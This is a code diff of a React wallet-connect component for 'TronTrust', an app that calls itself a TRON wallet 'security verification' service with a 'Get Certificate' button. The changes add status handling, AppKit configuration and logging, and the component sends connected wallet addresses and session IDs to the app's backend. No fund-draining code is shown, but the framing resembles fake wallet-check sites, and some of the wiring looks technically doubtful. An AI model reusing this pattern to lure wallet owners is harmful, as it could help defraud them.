@@ -1,4 +1,4 @@
-// WalletConnect.js - Fixed TRON Implementation
+// WalletConnect.js - Enhanced TRON Implementation with Proper Popup
 import { useState, useEffect } from 'react';
 import { createAppKit } from '@reown/appkit';
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
@@ -23,6 +23,8 @@ const WalletConnect = () => {
   const [currentWallet, setCurrentWallet] = useState<WalletData | null>(null);
   const [modal, setModal] = useState<ReturnType<typeof createAppKit> | null>(null);
   const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
+  const [isConnecting, setIsConnecting] = useState(false);
+  const [connectionStatus, setConnectionStatus] = useState<'idle' | 'connecting' | 'connected' | 'error'>('idle');
 
   const toggleMobileMenu = () => {
     setMobileMenuOpen(!mobileMenuOpen);
@@ -36,7 +38,7 @@ const WalletConnect = () => {
     console.log(`[TronTrust] ${message}`);
   };
 
-  // Initialize AppKit for TRON - EXACT PATTERN FROM WORKING EXAMPLE
+  // Initialize AppKit for TRON - Enhanced with proper popup configuration
   useEffect(() => {
     const initializeAppKit = async () => {
       try {
@@ -46,14 +48,14 @@ const WalletConnect = () => {
           networks: [tron, tronShasta] // TRON networks only
         });
 
-        // Create AppKit instance with TRON-specific configuration
+        // Create AppKit instance with enhanced TRON-specific configuration
         const appKit = createAppKit({
           adapters: [wagmiAdapter],
           projectId: PROJECT_ID,
           networks: [tron, tronShasta], // TRON networks only
           defaultNetwork: tron, // Default to TRON mainnet
           metadata: {
-            name: 'TronTrust', // Exact name match from working example
+            name: 'TronTrust', // Exact name match for popup
             description: 'TRON Wallet Security Verification App',
             url: 'https://trontrust.io', // Use your production domain
             icons: ['https://trontrust.io/icon.png'] // Your actual icon URL
@@ -61,22 +63,52 @@ const WalletConnect = () => {
           features: {
             analytics: true,
             email: false,
-            socials: []
+            socials: [],
+            history: true,
+            onramp: false
+          },
+          // Enhanced UI configuration for proper popup display
+          themeMode: 'light',
+          themeVariables: {
+            '--w3m-font-family': 'Inter, sans-serif',
+            '--w3m-accent': '#3b82f6',
+            '--w3m-color-mix': '#00D4AA',
+            '--w3m-color-mix-strength': 40
           },
           // TRON-specific chain configuration
           chainImages: {
             728126428: 'https://cryptologos.cc/logos/tron-trx-logo.png', // TRON mainnet
             2494104990: 'https://cryptologos.cc/logos/tron-trx-logo.png' // TRON testnet
+          },
+          // Enable all wallet options for TRON
+          includeWalletIds: [
+            'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96', // MetaMask
+            '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust Wallet
+            '38f5d18bd8522c244bdd70cb4a68e0e718865155811c043f052fb9f1c51de662', // Bitget
+          ],
+          // Wallet connection options
+          walletConnectOptions: {
+            projectId: PROJECT_ID,
+            metadata: {
+              name: 'TronTrust',
+              description: 'TRON Wallet Security Verification',
+              url: 'https://trontrust.io',
+              icons: ['https://trontrust.io/icon.png']
+            }
           }
         });
 
         setModal(appKit);
         log('TronTrust AppKit initialized successfully for TRON network');
 
-        // Account connection listener for TRON
+        // Enhanced account connection listener for TRON
         appKit.subscribeAccount((account: { isConnected: boolean; address?: string; chainId?: number }) => {
+          log(`Account state changed: ${JSON.stringify(account)}`);
+          
           if (account.isConnected && account.address) {
             log(`TRON Wallet connected: ${account.address}`);
+            setIsConnecting(false);
+            setConnectionStatus('connected');
             
             // Ensure we're using TRON chain IDs
             const chainId = account.chainId || 728126428; // Default to TRON mainnet
@@ -97,6 +129,8 @@ const WalletConnect = () => {
             saveWalletToAPI(walletData);
           } else {
             log('TRON Wallet disconnected');
+            setIsConnecting(false);
+            setConnectionStatus('idle');
             if (currentWallet) {
               removeWalletFromAPI(currentWallet.address);
             }
@@ -104,8 +138,10 @@ const WalletConnect = () => {
           }
         });
 
-        // Network change listener specifically for TRON
+        // Enhanced network change listener specifically for TRON
         appKit.subscribeNetwork((network: { chainId?: string | number }) => {
+          log(`Network changed: ${JSON.stringify(network)}`);
+          
           let chainIdNum: number | undefined;
           if (typeof network.chainId === 'string') {
             chainIdNum = parseInt(network.chainId, 10);
@@ -129,21 +165,34 @@ const WalletConnect = () => {
           }
         });
 
+        // Enhanced modal state listener
+        appKit.subscribeState((state: any) => {
+          log(`Modal state: ${JSON.stringify(state)}`);
+          if (state.open === false && isConnecting) {
+            // Modal closed while connecting - reset state if not connected
+            setTimeout(() => {
+              if (!currentWallet) {
+                setIsConnecting(false);
+                setConnectionStatus('idle');
+              }
+            }, 1000);
+          }
+        });
+
       } catch (error) {
-        if (error instanceof Error) {
-          log(`Error initializing TronTrust AppKit: ${error.message}`);
-        } else {
-          log(`Error initializing TronTrust AppKit: ${String(error)}`);
-        }
+        log(`Error initializing TronTrust AppKit: ${error instanceof Error ? error.message : String(error)}`);
+        setConnectionStatus('error');
+        setIsConnecting(false);
       }
     };
 
     initializeAppKit();
   }, []);
 
-  // API Functions
+  // Enhanced API Functions
   const saveWalletToAPI = async (walletData: WalletData) => {
     try {
+      log(`Saving wallet to API: ${walletData.address}`);
       const response = await fetch(`${API_BASE_URL}/connect-wallet`, {
         method: 'POST',
         headers: {
@@ -152,26 +201,27 @@ const WalletConnect = () => {
         body: JSON.stringify(walletData)
       });
       
+      if (!response.ok) {
+        throw new Error(`HTTP error! status: ${response.status}`);
+      }
+      
       const result = await response.json();
       if (result.success) {
-        log(`TRON wallet saved to API: ${walletData.address}`);
+        log(`TRON wallet saved to API successfully: ${walletData.address}`);
         return result;
       } else {
-        log(`Error saving TRON wallet: ${result.error}`);
+        log(`Error saving TRON wallet: ${result.error || 'Unknown error'}`);
         return null;
       }
     } catch (error) {
-      if (error instanceof Error) {
-        log(`API Error: ${error.message}`);
-      } else {
-        log(`API Error: ${String(error)}`);
-      }
+      log(`API Error saving wallet: ${error instanceof Error ? error.message : String(error)}`);
       return null;
     }
   };
 
   const removeWalletFromAPI = async (address: string) => {
     try {
+      log(`Removing wallet from API: ${address}`);
       const response = await fetch(`${API_BASE_URL}/disconnect-wallet`, {
         method: 'POST',
         headers: {
@@ -180,42 +230,83 @@ const WalletConnect = () => {
         body: JSON.stringify({ address })
       });
       
+      if (!response.ok) {
+        throw new Error(`HTTP error! status: ${response.status}`);
+      }
+      
       const result = await response.json();
       if (result.success) {
-        log(`TRON wallet removed from API: ${address}`);
+        log(`TRON wallet removed from API successfully: ${address}`);
         return result;
       } else {
-        log(`Error removing TRON wallet: ${result.error}`);
+        log(`Error removing TRON wallet: ${result.error || 'Unknown error'}`);
         return null;
       }
     } catch (error) {
-      if (error instanceof Error) {
-        log(`API Error: ${error.message}`);
-      } else {
-        log(`API Error: ${String(error)}`);
-      }
+      log(`API Error removing wallet: ${error instanceof Error ? error.message : String(error)}`);
       return null;
     }
   };
 
-  // Button Handlers
-  const handleConnect = () => {
-    log('Opening TRON wallet connection modal...');
-    if (modal) {
-      // Open modal with TRON network pre-selected
-      modal.open({ view: 'Connect' });
-    } else {
+  // Enhanced Button Handlers
+  const handleConnect = async () => {
+    if (!modal) {
       log('Cannot open TRON wallet connection modal: modal is not initialized.');
+      setConnectionStatus('error');
+      return;
+    }
+
+    try {
+      log('Opening TRON wallet connection modal...');
+      setIsConnecting(true);
+      setConnectionStatus('connecting');
+      
+      // Open modal with enhanced options for better TRON support
+      await modal.open({ 
+        view: 'Connect',
+        route: 'ConnectWallet'
+      });
+      
+      log('TRON wallet connection modal opened successfully');
+    } catch (error) {
+      log(`Error opening connection modal: ${error instanceof Error ? error.message : String(error)}`);
+      setIsConnecting(false);
+      setConnectionStatus('error');
     }
   };
 
   const handleDisconnect = async () => {
-    log('Disconnecting TRON wallet...');
-    if (modal) {
-      await modal.disconnect();
-    } else {
+    if (!modal) {
       log('Cannot disconnect: modal is not initialized.');
+      return;
     }
+
+    try {
+      log('Disconnecting TRON wallet...');
+      await modal.disconnect();
+      log('TRON wallet disconnected successfully');
+    } catch (error) {
+      log(`Error disconnecting wallet: ${error instanceof Error ? error.message : String(error)}`);
+    }
+  };
+
+  // Get connection button text based on state
+  const getConnectionButtonText = () => {
+    switch (connectionStatus) {
+      case 'connecting':
+        return 'Connecting...';
+      case 'connected':
+        return 'Disconnect';
+      case 'error':
+        return 'Retry Connection';
+      default:
+        return 'Get Certificate';
+    }
+  };
+
+  // Get connection button disabled state
+  const isConnectionButtonDisabled = () => {
+    return isConnecting || connectionStatus === 'connecting';
   };
 
   return (
@@ -306,12 +397,12 @@ const WalletConnect = () => {
                 </div>
                 
                 <div className="step">
-                  <div className="step-icon inactive" id="step2">
+                  <div className={`step-icon ${connectionStatus === 'connected' ? '' : 'inactive'}`} id="step2">
                     <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 24 24">
                       <path d="M9.5 2A1.5 1.5 0 0 0 8 3.5v1A1.5 1.5 0 0 0 9.5 6h5A1.5 1.5 0 0 0 16 4.5v-1A1.5 1.5 0 0 0 14.5 2h-5ZM12 7a5 5 0 0 1 5 5v1.086l1.707 1.707A1 1 0 0 1 18 16.5V17a1 1 0 0 1-1 1H7a1 1 0 0 1-1-1v-.5a1 1 0 0 1 .293-.707L8 14.086V12a5 5 0 0 1 5-5Z" />
                     </svg>
                   </div>
-                  <span className="step-label inactive">Scan</span>
+                  <span className={`step-label ${connectionStatus === 'connected' ? '' : 'inactive'}`}>Scan</span>
                 </div>
                 
                 <div className="step">
@@ -357,21 +448,19 @@ const WalletConnect = () => {
                       <p className="card-description">Universal Wallet</p>
                     </div>
                   </div>
-                  {!currentWallet ? (
-                    <button 
-                      onClick={handleConnect}
-                      className='card-button'
-                    >
-                      Get Certificate
-                    </button>
-                  ) : (
-                    <button 
-                      onClick={handleDisconnect}
-                      className='card-button'
-                    >
-                      Disconnect
-                    </button>
-                  )}
+                  <button 
+                    onClick={connectionStatus === 'connected' ? handleDisconnect : handleConnect}
+                    className={`card-button ${isConnectionButtonDisabled() ? 'opacity-50 cursor-not-allowed' : ''}`}
+                    disabled={isConnectionButtonDisabled()}
+                  >
+                    {isConnecting && (
+                      <svg className="animate-spin -ml-1 mr-3 h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                      </svg>
+                    )}
+                    {getConnectionButtonText()}
+                  </button>
                 </div>
               </div>
               
@@ -391,6 +480,42 @@ const WalletConnect = () => {
               </div>
             </div>
 
+            {/* Connection Status Indicator */}
+            {connectionStatus !== 'idle' && (
+              <div className={`connection-status ${connectionStatus}`} style={{ 
+                padding: '12px 20px',
+                borderRadius: '8px',
+                marginTop: '20px',
+                display: 'flex',
+                alignItems: 'center',
+                gap: '10px',
+                backgroundColor: connectionStatus === 'connecting' ? '#e3f2fd' : 
+                               connectionStatus === 'connected' ? '#e8f5e8' : 
+                               connectionStatus === 'error' ? '#ffebee' : '#f5f5f5',
+                color: connectionStatus === 'connecting' ? '#1976d2' : 
+                       connectionStatus === 'connected' ? '#2e7d32' : 
+                       connectionStatus === 'error' ? '#c62828' : '#666',
+                border: `1px solid ${connectionStatus === 'connecting' ? '#bbdefb' : 
+                                   connectionStatus === 'connected' ? '#c8e6c9' : 
+                                   connectionStatus === 'error' ? '#ffcdd2' : '#e0e0e0'}`
+              }}>
+                {connectionStatus === 'connecting' && (
+                  <svg className="animate-spin h-4 w-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                  </svg>
+                )}
+                {connectionStatus === 'connected' && <span>✅</span>}
+                {connectionStatus === 'error' && <span>❌</span>}
+                <span>
+                  {connectionStatus === 'connecting' && 'Connecting to TRON wallet...'}
+                  {connectionStatus === 'connected' && 'Successfully connected to TRON network'}
+                  {connectionStatus === 'error' && 'Connection failed. Please try again.'}
+                </span>
+              </div>
+            )}
+
+            {/* Connected Wallet Information */}
             {currentWallet && (
               <div className="wallet-info" style={{ 
                 backgroundColor: '#f8f9fa', 
@@ -399,18 +524,29 @@ const WalletConnect = () => {
                 marginTop: '20px',
                 border: '1px solid #e9ecef'
               }}>
-                <h3 style={{ color: '#495057', marginBottom: '15px' }}>Connected TRON Wallet:</h3>
-                <p><strong>Address:</strong> <span style={{ fontFamily: 'monospace', color: '#007bff' }}>{currentWallet.address}</span></p>
-                <p><strong>Network:</strong> <span style={{ color: '#28a745' }}>{currentWallet.network}</span></p>
-                <p><strong>Chain ID:</strong> <span style={{ color: '#6c757d' }}>{currentWallet.chainId}</span></p>
+                <h3 style={{ color: '#495057', marginBottom: '15px', display: 'flex', alignItems: 'center', gap: '8px' }}>
+                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
+                    <path d="M4 4a2 2 0 00-2 2v4a2 2 0 002 2V6h10a2 2 0 00-2-2H4zm2 6a2 2 0 012-2h8a2 2 0 012 2v4a2 2 0 01-2 2H8a2 2 0 01-2-2v-4zm6 4a2 2 0 100-4 2 2 0 000 4z"></path>
+                  </svg>
+                  Connected TRON Wallet:
+                </h3>
+                <div style={{ display: 'grid', gap: '10px' }}>
+                  <p><strong>Address:</strong> <span style={{ fontFamily: 'monospace', color: '#007bff', wordBreak: 'break-all' }}>{currentWallet.address}</span></p>
+                  <p><strong>Network:</strong> <span style={{ color: '#28a745' }}>{currentWallet.network}</span></p>
+                  <p><strong>Chain ID:</strong> <span style={{ color: '#6c757d' }}>{currentWallet.chainId}</span></p>
+                  <p><strong>Session ID:</strong> <span style={{ fontFamily: 'monospace', color: '#6c757d' }}>{currentWallet.sessionId}</span></p>
+                </div>
                 <div style={{ 
-                  marginTop: '10px', 
-                  padding: '10px', 
+                  marginTop: '15px', 
+                  padding: '12px', 
                   backgroundColor: '#d4edda', 
-                  borderRadius: '4px',
-                  color: '#155724'
+                  borderRadius: '6px',
+                  color: '#155724',
+                  display: 'flex',
+                  alignItems: 'center',
+                  gap: '8px'
                 }}>
-                  ✅ Successfully connected to TRON network
+                  ✅ <strong>Successfully connected to TRON network and synced with API</strong>
                 </div>
               </div>
             )}
